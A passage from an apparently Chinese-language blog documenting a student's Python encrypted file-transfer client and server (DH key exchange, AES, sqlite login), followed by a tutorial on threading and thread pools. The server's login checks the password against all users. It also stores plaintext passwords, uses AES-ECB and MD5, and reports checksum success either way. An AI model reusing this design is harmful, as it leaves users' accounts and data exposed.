register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)   #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    base_data = base64.b64encode(data.encode())</span><br><span class="line">    transfer_data = pack_data(3,base_data,shared_key,0,0,data.encode())</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)   #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        base64_text = base64.b64encode(text.encode())</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(base64_text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text.encode())</span><br><span class="line">        transfer_data = pack_data(1,base_text,shared_key,sliced,sliced_sum,text.encode())</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        begin_time = time.time()</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced_basedata = base64.b64encode(sliced_data[i])</span><br><span class="line">            transfer_data = pack_data(2,sliced_basedata,shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            text = (s.recv(1024)).decode()</span><br><span class="line">            currect_time = time.time()</span><br><span class="line">            temp = currect_time-begin_time</span><br><span class="line">            print(&quot;\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text)</span><br><span class="line">        transfer_data = pack_data(2,base_text,shared_key,sliced,sliced_sum,text)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line">conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;等待客户机连接&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(f&quot;客户机&#123;sock&#125;&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr  #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode() </span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    base_data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    data = base64.b64decode(base_data.encode())</span><br><span class="line">    value = verify_md5(data,data_md5,sock)</span><br><span class="line">    if value == 0:</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    else :</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data,value</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,cursor):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1</span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0</span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data):</span><br><span class="line">    print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data):  #处理非切片数据</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    if data_type == &quot;text/plain&quot;:</span><br><span class="line">        with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data.encode())</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): #处理切片数据</span><br><span class="line">    data_bytes = data</span><br><span class="line">    while sliced_num != sliced_sum-1:</span><br><span class="line">        orign_data = (sock.recv(2048))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            print(&quot;客户机意外中断连接&quot;)</span><br><span class="line">            return</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    if data_type == &quot;image/png&quot;:</span><br><span class="line">        with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">        with open(&quot;output.mp3&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,shared_key,cursor,data):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5,sock):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">        print(&quot;公钥交换成功&quot;)</span><br><span class="line">        print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">        shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        permission_value = Authentication(sock,shared_key,cursor)</span><br><span class="line">        if permission_value == 3:</span><br><span class="line">            print(&quot;客户机意外中断连接&quot;)</span><br><span class="line">            continue</span><br><span class="line">        while 1:</span><br><span class="line">            menu(sock)</span><br><span class="line">            orign_data = (sock.recv(2048))</span><br><span class="line">            if len(orign_data) == 0:</span><br><span class="line">                print(&quot;客户机意外中断连接&quot;)</span><br><span class="line">                break</span><br><span class="line">            sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">            if data_type == 1:</span><br><span class="line">                transfer_txt(addr,data)</span><br><span class="line">            elif data_type == 2:</span><br><span class="line">                if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                    transfer_file2(sock,data,sliced_sum,sliced_num,shared_key)</span><br><span class="line">                else:</span><br><span class="line">                    transfer_file(sock,data)</span><br><span class="line">            elif data_type ==3:</span><br><span class="line">                register(permission_value,sock,shared_key,cursor,data)</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="v0-6"><a href="#v0-6" class="headerlink" title="v0.6"></a>v0.6</h2><p>这一版针对传输过慢的原因进行了排除 感觉是因为传之前过了一遍base64的原因 这里进行了删除<br>以前的代码实际上是没有考虑过多端连接的 所以这一版的代码主要针对多端连接进行优化<br>原本的代码 client1连接后  client2能够连接上服务器 但是交换公钥的时候会阻塞<br>这是因为公钥交换相关的代码没有考虑到多端的情况<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411032223778.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411032223778.png" alt="image.png"></a><br>来假设一种情况 客户机A连接上服务端后 进行密钥交换完成后 开始进入数据传输阶段<br>按照原本的程序设计 此时的服务端程序已经进入了while循环处理数据传输的请求<br>但是如果此时有客户机B想要连接服务端 服务端就不会去处理客户机B的密钥交换<br>为了解决这个问题 应该要使用线程池来处理多线程的情况<br>多线程的实现难点应该在于确保多个线程之间的共享数据同步 在设计程序之间并没有这方面的经验 所以打算先通过编写几个简单的程序来熟悉一下</p><h3 id="多线程实现的学习"><a href="#多线程实现的学习" class="headerlink" title="多线程实现的学习"></a>多线程实现的学习</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line">    print(threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread2.start()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>通过定义一个thread对象 并且赋值target 即需要该线程执行的函数 同时给予参数<br>定义完成后thread对象完成初始化 通过start来运行线程<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041822760.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041822760.png" alt="image.png"></a><br>主进程和线程是同时运行的 如果想要让主进程阻塞 等待线程运行结束后再运行主线程<br>这时候可以使用join来让主进程等待线程执行完毕</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    # thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    print(f&quot;thread1线程当前存活情况&#123;thread1.is_alive()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827877.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827877.png" alt="image.png"></a><br>接下来加入join</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    # thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread1.join(1)</span><br><span class="line">    print(f&quot;thread1线程当前存活情况&#123;thread1.is_alive()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827424.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827424.png" alt="image.png"></a><br>join的原理是等待对应thread对象执行完毕 或者给予参数 等待参数时间<br>所以也可以用来规划两个进程的执行先后顺序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread2.start()</span><br><span class="line">    thread2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>上述代码应该是先执行thread1 但是由于thread2调用了join 此时应该会先等待thread2执行完毕再执行其他线程  这里print_name函数的sleep也是为了防止thread1执行过快导致还没主进程还没执行thread2.join()就结束了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042034813.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042034813.png" alt="image.png"></a><br>接着来看下面的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    for i in range(10):</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        print(f&quot;现在是线程&#123;threading.current_thread().name&#125;第&#123;i&#125;次执行循环&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;主进程即将结束&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>按照预期的效果 在输出”主进程即将结束”后 主进程应该就结束了 同时thread1执行全部循环至少需要5s 而主进程执行时间应该在2-5以内 但是事实是主进程要一直等到thread1执行完毕才能结束<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042040695.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042040695.png" alt="image.png"></a><br>这一点是由定义thread对象的时候 一个叫daemon的参数决定的<br>其默认值为False 即主进程等待thread1线程执行完毕后才能结束 如果改为True 主进程结束时 线程就会结束</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    for i in range(10):</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        print(f&quot;现在是线程&#123;threading.current_thread().name&#125;第&#123;i&#125;次执行循环&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,),daemon=True)</span><br><span class="line">    thread1.start()</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;主进程即将结束&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042044434.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042044434.png" alt="image.png"></a><br>如果想要让线程1执行两个函数呢<br>即执行完函数A后再执行函数B 这一点实现起来也很简单 只需要在函数A的最后调用函数B即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def next_task():</span><br><span class="line">    print(&quot;这是第二个任务&quot;)</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(&quot;这是第一个任务&quot;)</span><br><span class="line">    next_task()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042107756.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042107756.png" alt="image.png"></a><br>但是这一操作的弊端也很明显 那就是假如此时我们需要创建两个线程<br>线程1需要先执行函数A再执行函数B<br>线程2需要先执行函数B再执行函数A<br>这时候就会产生冲突 这又得去编写一个中转函数来识别需求 然后做if分支了 显然十分麻烦<br>这时候就可以自定义thread类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class myself_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line">    </span><br><span class="line">    def run(self):</span><br><span class="line">        print(f&quot;这是线程&#123;self.name&#125;在运行&quot;)</span><br><span class="line"></span><br><span class="line">    def test(self):</span><br><span class="line">        print(&quot;这是一个测试函数&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = myself_thread()</span><br><span class="line">    thread1.run()</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread1.test()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>如上述代码 我们自定义了一个myself_thread类 并且继承了threading.Thread 这个类的run函数以及其他函数都可以由我们自定义 针对不同的需求来调用函数也变得十分简单<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042110907.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042110907.png" alt="image.png"></a><br>如果服务端采用这种方式来新增线程 考虑到如果遭受ddos攻击 那么处理的线程数就会过多<br>这时候应该考虑采用线程池的方法来处理<br>线程池在程序启动时就创建大量空闲线程 在程序需要线程来执行函数的时候 就会分配一个线程出来 当线程执行完毕后 又会回到线程池 因此使用线程池可以有效的控制程序中并发线程的数量<br>运行下面这个程序 创建一个含有10个空闲线程的线程池</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name():</span><br><span class="line">    print(f&quot;现在是线程&#123;threading.current_thread().name&#125;正在执行&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=10)</span><br><span class="line"></span><br><span class="line">thread1 = pool.submit(print_name)</span><br><span class="line">thread2 = pool.submit(print_name)</span><br></pre></td></tr></table></figure><p>输出的结果为<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411051453985.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411051453985.png" alt="image.png"></a><br>说明执行时间过短 在线程0执行完毕后 就作为空闲线程返回线程池 随后第二次需要执行print_name函数的时候 就又被分配出来了<br>为了印证猜想 在print_name函数中加入time.sleep(0.5)<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411051457428.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411051457428.png" alt="image.png"></a><br>这时就是由两个线程来处理了<br>还可以使用map方法来并发的调用线程 不过需要注意的是 (1,2,3)是赋予给print_name函数的参数 但是实际上print_name不需要参数 这一点暂时还没找到方法来优化 总感觉有点多余 但是不给予参数 map又无法指定调用多少个线程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name(number):</span><br><span class="line">    print(f&quot;现在是线程&#123;threading.current_thread().name&#125;正在执行&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=10)</span><br><span class="line"></span><br><span class="line">thread = pool.map(print_name,(1,2,3))</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411051516319.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411051516319.png" alt="image.png"></a><br>最后的输出结果仍然是全部由线程0来负责 说明map方法就是简化了多个submit方法</p><h3 id="多线程应用"><a href="#多线程应用" class="headerlink" title="多线程应用"></a>多线程应用</h3><p>目前的整改思路如下:<br>服务端:<br>主进程负责处理accpet 有客户机连接就调用一个线程来处理密钥交换和数据传输  然后这个线程就专门负责这台客户机 如果客户机中断连接 那就释放线程 回到线程池<br>客户端:<br>这块的整改还在考虑中 因为就目前来说 传输效率确实有点感人了 传一个10mb的音频都需要十来分钟 如果客户端改成 可以并发的传输数据 即同时传输音频和图像 或者是把一个音频拆成多个线程来传输 这样效率应该可以大大提高 但是感觉编写难度有点大啊 看着来吧<br>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">import base64</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class 